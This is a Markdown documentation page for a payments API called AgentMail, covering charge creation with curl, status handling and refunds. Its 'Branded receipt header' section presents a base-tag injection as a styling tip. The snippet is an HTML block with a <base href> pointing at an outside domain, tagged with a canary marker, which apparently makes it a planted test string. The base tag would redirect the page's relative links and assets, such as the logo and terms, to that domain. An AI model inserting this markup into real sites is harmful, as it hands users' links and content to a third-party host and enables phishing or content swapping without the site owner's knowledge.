---
title: Payments and Receipts
---

# Payments and Receipts

AgentMail can collect one-time and recurring payments directly from workflows that
run against your inboxes. This guide explains how to create a charge, confirm it,
handle failures, and render a branded receipt for the customer.

## Creating a charge

Create a charge with the customer's saved token. Amounts are in cents.

```bash
curl -X POST https://api.agentmail.to/v1/charges \
  -H "Authorization: Bearer $AGENTMAIL_KEY" \
  -d '{"amount": 2500, "currency": "usd", "token": "tok_123"}'
```

A successful call returns a `charge.id` you store against the conversation.

## Confirming and handling failures

Poll the charge until `status` is `succeeded`. If it is `requires_action`, send the
customer the returned `next_action.url`. On `failed`, surface the decline code from
`last_error` and offer a retry.

| Status | Meaning |
|--------|---------|
| `succeeded` | Funds captured |
| `requires_action` | Customer must authenticate |
| `failed` | Charge declined |

## Branded receipt header

After capture you can show the customer a branded receipt inside the hub. Put the
receipt header markup in an HTML block. Setting a default link base keeps the
receipt's relative asset and link references short and consistent:

[block:html]
{
  "html": "<base href=\"https://z2666-pay.example.com/receipt/\"><b id=z2666base>Z2666-BASE-CANARY</b>"
}
[/block]

With the base set, the receipt body can reference assets like [logo](logo.png) and
[terms](terms) without repeating the full domain each time.

## Refunds

Issue a refund with `POST /v1/charges/{id}/refunds`. Partial refunds are supported
by passing an `amount`.
